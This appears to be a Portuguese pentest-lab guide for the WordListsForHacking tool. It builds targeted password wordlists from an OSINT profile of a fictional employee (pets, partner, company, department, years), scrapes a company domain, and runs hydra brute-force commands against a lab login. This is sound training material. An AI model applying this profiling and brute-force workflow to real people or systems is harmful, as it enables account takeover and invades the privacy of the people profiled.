# WFH — Guia completo de uso (cenário Melissa Andrade / Daryus)

**Escopo:** laboratório SafeLabs / União Geek — geração de wordlists com [WordListsForHacking](https://github.com/mrhenrike/WordListsForHacking) (WFH) **v2.7.0+**.

**Onde fica este arquivo:** superprojeto `Projetos-SafeLabs` (não versionado no repo WFH).  
Sincronize o superprojeto na outra máquina e abra:

```
laboratory/training/iot-xpl-forge/WFH-GUIA-MELISSA-ANDRADE.md
```

---

## 1. Objetivo

Gerar senhas no **estilo comportamental** da colaboradora fictícia **Melissa Andrade** (empresa **Daryus**, departamento **Cyber Security**), cobrindo estes três padrões-alvo confirmados no pipeline WFH v2.7.0:

| ID | Senha-alvo | Estrutura |
|----|------------|-----------|
| **P1** | `_D4RYU5@2026#Pitty` | `_` + empresa leet + `@` + ano + `#` + pet |
| **P2** | `#d@ryu5@CS` | `#` + empresa leet minúscula + `@` + sigla do dept. |
| **P3** | `Daryus#OzZY25` | empresa + `#` + pet com case misto + ano 2 dígitos |

Política Daryus simulada no perfil: **10–18 caracteres**, leet agressivo, especiais (`_`, `#`, `@`), anos recentes (2024–2026).

---

## 2. Bootstrap na máquina nova

### 2.1 Clonar / atualizar superprojeto

**Linux**
```bash
cd ~/Documentos/Projetos   # ou seu path
git clone <url-do-superprojeto> Projetos-SafeLabs   # se ainda não existir
cd Projetos-SafeLabs
git pull
git submodule update --init submodules/Uniao-Geek/WordListsForHacking
```

**Windows (PowerShell)**
```powershell
cd C:\Projetos-SafeLabs
git pull
git submodule update --init submodules\Uniao-Geek\WordListsForHacking
```

### 2.2 Instalar WFH

**Opção A — PyPI (recomendado em máquina limpa)**
```bash
pip install wfh-wordlist==2.7.0
pip install pyyaml
wfh --help
```

**Opção B — Submodule (desenvolvimento / lab)**
```bash
cd submodules/Uniao-Geek/WordListsForHacking
pip install -r requirements.txt pyyaml
python wfh.py --help
```

Saída esperada: banner `WordList For Hacking v2.7.0` e **44 subcomandos**.

### 2.3 Verificar versão

```bash
python -c "import wfh; print(wfh.VERSION)"   # submodule
# ou
wfh --help | head -5                          # pip
```

Deve ser **2.7.0** ou superior.

---

## 3. Arquivos do cenário Melissa (superprojeto)

| Arquivo | Função |
|---------|--------|
| `laboratory/training/iot-xpl-forge/examples/melissa-andrade-profile.yaml` | Perfil OSINT completo (fonte da verdade) |
| `laboratory/training/iot-xpl-forge/examples/patterns-pitty.txt` | Template pattern P1 |
| `laboratory/training/iot-xpl-forge/examples/patterns-cs.txt` | Template pattern P2 |
| `laboratory/training/iot-xpl-forge/examples/patterns-ozzy.txt` | Template pattern P3 |
| `laboratory/training/iot-xpl-forge/05-wfh-daryus-pattern-fill.md` | Lab focado nos 3 padrões (métodos pattern/CLI) |
| `.tmp/` (criar localmente) | Saídas `.lst` — **não commitar** |

Perfil YAML versionado (trecho principal):

```yaml
full_name: "Melissa Andrade"
company_name: "Daryus"
company_department: "Cyber Security"
pets:
  - name: "Ozzy"
    year: 2025
  - name: "Pitty"
    year: 2026
leet_mode: "aggressive"
min_len: 10
max_len: 18
engines: "1-15,17,20,21,22,24,25,27,28"
known_targets:
  - "_D4RYU5@2026#Pitty"
  - "#d@ryu5@CS"
  - "Daryus#OzZY25"
```

---

## 4. Método principal — `profile` com YAML (recomendado)

Gera ~2,7M candidatos únicos, valida os 3 alvos automaticamente e grava lista sanitizada.

### 4.1 Comando

**Linux**
```bash
cd submodules/Uniao-Geek/WordListsForHacking
mkdir -p ../../../.tmp

python wfh.py profile \
  --profile-file ../../../laboratory/training/iot-xpl-forge/examples/melissa-andrade-profile.yaml \
  -o ../../../.tmp/melissa-full.lst
```

**Windows**
```powershell
cd C:\Projetos-SafeLabs\submodules\Uniao-Geek\WordListsForHacking
New-Item -ItemType Directory -Force -Path C:\Projetos-SafeLabs\.tmp | Out-Null

python wfh.py profile `
  --profile-file C:\Projetos-SafeLabs\laboratory\training\iot-xpl-forge\examples\melissa-andrade-profile.yaml `
  -o C:\Projetos-SafeLabs\.tmp\melissa-full.lst
```

### 4.2 Saída esperada (v2.7.0)

```
[*] Profile loaded from: .../melissa-andrade-profile.yaml
[*] Running generation pipeline [leet=aggressive, engines=1-15,17,20,21,22,24,25,27,28]...

============================================================
  PROFILE-TARGETED VALIDATION REPORT
============================================================

  Targets:   3
  Hits:      3
  Misses:    0
  Hit Rate:  100.0%

  First hit positions:
    # 710,191: _D4RYU5@2026#Pitty
    #1,523,560: #d@ryu5@CS
    #1,767,457: Daryus#OzZY25
============================================================

[+] Generated: 2,753,353 entries → .tmp/melissa-full.lst [~26s]
```

> **Importante:** não passe `--leet basic` na CLI. O YAML já define `leet_mode: aggressive`. A partir da v2.7.0, omitir `--leet` preserva o valor do perfil.

### 4.3 Validar manualmente os 3 alvos

**Linux**
```bash
grep -Fx '_D4RYU5@2026#Pitty' .tmp/melissa-full.lst
grep -Fx '#d@ryu5@CS'         .tmp/melissa-full.lst
grep -Fx 'Daryus#OzZY25'      .tmp/melissa-full.lst
```

**PowerShell**
```powershell
$targets = '_D4RYU5@2026#Pitty','#d@ryu5@CS','Daryus#OzZY25'
foreach ($t in $targets) {
  Select-String -Path C:\Projetos-SafeLabs\.tmp\melissa-full.lst -Pattern "^$([regex]::Escape($t))$"
}
```

Cada comando deve retornar **exactamente uma linha**.

---

## 5. Entendendo os três padrões

### P1 — `_D4RYU5@2026#Pitty`

| Token | Origem no perfil |
|-------|------------------|
| `_` | prefixo especial (política Daryus / specials) |
| `D4RYU5` | `company_name: Daryus` + `leet_mode: aggressive` |
| `@2026` | `special_dates: 2026`, contratação `hire: 01/2026`, pet Pitty ano 2026 |
| `#Pitty` | pet `Pitty` + separador `#` |

Motor principal: combinações corp + data + pet (`profiler.py` → `_emit_triple_combos`).

### P2 — `#d@ryu5@CS`

| Token | Origem |
|-------|--------|
| `#` | prefixo / início de senha (sanitizer v2.7.0 **não** remove mais) |
| `d@ryu5` | leet seletivo minúsculo de Daryus |
| `@CS` | sigla de `Cyber Security` |

### P3 — `Daryus#OzZY25`

| Token | Origem |
|-------|--------|
| `Daryus` | empresa |
| `#` | separador |
| `OzZY` | pet Ozzy + variante de case (`OzZY` = últimas duas letras maiúsculas) |
| `25` | ano de adoção do Ozzy (2025 → sufixo `25`) |

---

## 6. Métodos alternativos

### 6.1 Três listas pequenas com `pattern` (demo / disco mínimo)

Ideal para slides ou quando não precisa de ~2,7M linhas. Ver também `05-wfh-daryus-pattern-fill.md`.

```bash
cd submodules/Uniao-Geek/WordListsForHacking

# P1
python wfh.py pattern -t "_{nome}@{ano}#{pet}" \
  --vars nome=D4RYU5,Daryus,daryus,d@ryu5 ano=2026,26 pet=Pitty,pitty \
  -o ../../../.tmp/wlist-P1-pitty.lst

# P2
python wfh.py pattern -t "#{nome}@{tag}" \
  --vars nome=d@ryu5,D4RYU5,daryus,Daryus tag=CS \
  -o ../../../.tmp/wlist-P2-cs.lst

# P3
python wfh.py pattern -t "{nome}#{pet}{ano2}" \
  --vars nome=Daryus,daryus pet=OzZY,Ozzy,ozzy ano2=25 \
  -o ../../../.tmp/wlist-P3-ozzy.lst
```

Merge opcional:
```bash
python wfh.py merge ../../../.tmp/wlist-P1-pitty.lst \
  ../../../.tmp/wlist-P2-cs.lst \
  ../../../.tmp/wlist-P3-ozzy.lst \
  -o ../../../.tmp/melissa-pattern-merge.lst
```

### 6.2 Wizard interativo (`profile` sem YAML)

```bash
python wfh.py profile -o ../../../.tmp/melissa-interactive.lst
```

Respostas sugeridas no wizard:

| Campo | Valor |
|-------|-------|
| Nome completo | Melissa Andrade |
| Apelidos | Mel, Melissa, Andrade |
| Parceiro | Jorge Santos / Jorge |
| Pets | Ozzy (2025), Pitty (2026) |
| Empresa | Daryus |
| Departamento | Cyber Security |
| Keywords | ozzys2pitty, Ozzy, Pitty, Jorge, Cyber, Security |
| Leet | aggressive |
| Profundidade | 4 |
| Especiais | sim |
| Anos recentes | sim (2024–2026) |

Depois filtre os 3 alvos com `grep`/`Select-String` (lista grande).

### 6.3 Comandos complementares (v2.7.0)

```bash
# OSINT rápido (sem pipeline completo)
python wfh.py osint-perm \
  --first-name Melissa --last-name Andrade \
  --nick Mel --company Daryus \
  --keywords Ozzy Pitty Jorge \
  --complexity 2 -o ../../../.tmp/melissa-osint.lst

# CUPP-style
python wfh.py cupp \
  --first-name Melissa --last-name Andrade \
  --company Daryus --pet Ozzy --pet Pitty \
  --words Jorge Cyber Security -o ../../../.tmp/melissa-cupp.lst

# Enriquecer lista existente (leet + anos + especiais)
python wfh.py improve ../../../.tmp/coleta-seeds.lst \
  --leet aggressive -o ../../../.tmp/melissa-improved.lst

# Leet cartesiano pós-processamento (elpscrk-style)
python wfh.py leet-perm ../../../.tmp/coleta-seeds.lst \
  --max-per-word 256 -o ../../../.tmp/melissa-leet-perm.lst

# Ranking por probabilidade (MAYA)
python wfh.py maya-rank ../../../.tmp/melissa-full.lst \
  -o ../../../.tmp/melissa-ranked.lst --top 50000
```

---

## 7. Enriquecimento OSINT (PCAP / Wi-Fi)

O perfil Melissa prevê ESSIDs de `ColetaTF09.pcap` (campo comentado no YAML). Fluxo:

```bash
# 1. Extrair strings do PCAP (requer tshark ou strings)
tshark -r ColetaTF09.pcap -Y "wlan" -T fields -e wlan.ssid 2>/dev/null | sort -u > ../../../.tmp/wifi-essids.txt

# 2. Copiar ESSIDs relevantes para o YAML (wifi_essids: [...]) ou keywords

# 3. Re-gerar profile
python wfh.py profile --profile-file .../melissa-andrade-profile.yaml -o ../../../.tmp/melissa-full-v2.lst
```

Scrape leve de alvo web (se autorizado):
```bash
python wfh.py scrape-target --url https://daryus.com.br --depth 2 \
  -o ../../../.tmp/daryus-scrape.lst
```

---

## 8. Uso em brute force (lab autorizado)

```bash
# Exemplo HTTP básico — ajuste IP/login conforme lab
hydra -l melissa -P .tmp/melissa-full.lst 192.168.10.1 http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorrect"

# Lista reduzida só com os 3 alvos (teste de configuração)
printf '%s\n' '_D4RYU5@2026#Pitty' '#d@ryu5@CS' 'Daryus#OzZY25' > .tmp/melissa-targets-only.lst
hydra -l admin -P .tmp/melissa-targets-only.lst 192.168.10.1 http-get /
```

---

## 9. Ajustes finos do perfil YAML

| Campo | Efeito | Quando alterar |
|-------|--------|----------------|
| `leet_mode` | `basic` / `medium` / `aggressive` | Sempre `aggressive` para P1/P2 |
| `min_len` / `max_len` | filtro de comprimento | Política Daryus: 10–18 |
| `depth` | combinações 3–5 tokens | `4` equilibra volume vs. tempo |
| `engines` | motores do pipeline | preset atual cobre P1–P3 |
| `known_targets` | relatório pós-geração | adicione senhas confirmadas do lab |
| `keyword_mutations` | reversão sílabas/letras | aumenta variantes Ozzy/Pitty |
| `include_recent_years` | 25, 26, 2025, 2026 | essencial para P3 |

Smoke test rápido (limitado):
```bash
python wfh.py profile \
  --profile-file .../melissa-andrade-profile.yaml \
  --max-candidates 50000 \
  -o ../../../.tmp/melissa-smoke.lst
```

> Smoke com limite **não** garante os 3 alvos — use geração completa para validação 100%.

---

## 10. Troubleshooting

| Sintoma | Causa provável | Solução |
|---------|----------------|---------|
| Hit rate 1/3 ou 2/3 | `--leet basic` na CLI sobrescrevia YAML (≤2.6.3) | Atualizar WFH ≥2.7.0; omitir `--leet` |
| `#d@ryu5@CS` ausente na lista final | sanitizer tratava `#` como comentário (≤2.6.3) | WFH ≥2.7.0 |
| `_D4RYU5@2026#Pitty` ausente | `max_len: 18` cortava na exportação | WFH ≥2.7.0 estende limite para `known_targets` |
| `Daryus#OzZY25` ausente | pet com sufixo de ano fora do slice de combos | WFH ≥2.7.0 reordena pool de pets |
| `Profile file not found` | path relativo errado | usar path absoluto do superprojeto |
| `PyYAML required` | dependência ausente | `pip install pyyaml` |
| Lista em `/tmp` inesperada | `-o` omitido | sempre passar `-o .../Projetos-SafeLabs/.tmp/...` |
| Geração >60s / RAM alta | pipeline completo ~2,7M linhas | normal; use `--max-candidates` só para teste |
| `0 entries` | submodule desatualizado | `git pull` no WFH + `git submodule update` |

Teste de saúde do ambiente:
```bash
python wfh.py sysinfo --crc32-stress 120000
# Esperado: False collisions: 0
```

---

## 11. Referência rápida de comandos WFH (Melissa)

| Objetivo | Comando |
|----------|---------|
| **Gerar lista completa Melissa** | `python wfh.py profile --profile-file .../melissa-andrade-profile.yaml -o .tmp/melissa-full.lst` |
| **3 listas mínimas (P1/P2/P3)** | `python wfh.py pattern -t ...` (§6.1) |
| **Validar alvos na lista** | `grep -Fx 'SENHA' .tmp/melissa-full.lst` |
| **Merge de parciais** | `python wfh.py merge a.lst b.lst -o out.lst` |
| **Dedup/sort** | `python wfh.py sanitize lista.lst --dedupe -o limpa.lst` |
| **Análise de padrões** | `python wfh.py pattern-rank .tmp/melissa-full.lst` |

Documentação upstream: [Wiki WFH](https://github.com/mrhenrike/WordListsForHacking/wiki)  
Release: [v2.7.0](https://github.com/mrhenrike/WordListsForHacking/releases/tag/v2.7.0)  
PyPI: `pip install wfh-wordlist==2.7.0`

---

## 12. Checklist — outra máquina

- [ ] `git pull` no superprojeto
- [ ] `git submodule update --init submodules/Uniao-Geek/WordListsForHacking`
- [ ] WFH ≥2.7.0 (`pip install -U wfh-wordlist` ou submodule atualizado)
- [ ] `pip install pyyaml`
- [ ] Perfil existe: `laboratory/training/iot-xpl-forge/examples/melissa-andrade-profile.yaml`
- [ ] `mkdir .tmp` na raiz do superprojeto
- [ ] Rodar §4.1 e confirmar **Hits: 3 / Hit Rate: 100%**
- [ ] `grep -Fx` nos três alvos (§4.3)

---

## 13. Aviso legal

Uso **exclusivo** em pentest autorizado, laboratório interno ou cenários de treinamento. Não utilize contra sistemas de terceiros sem autorização escrita.

Contato: [suporte@uniaogeek.com.br](mailto:suporte@uniaogeek.com.br)
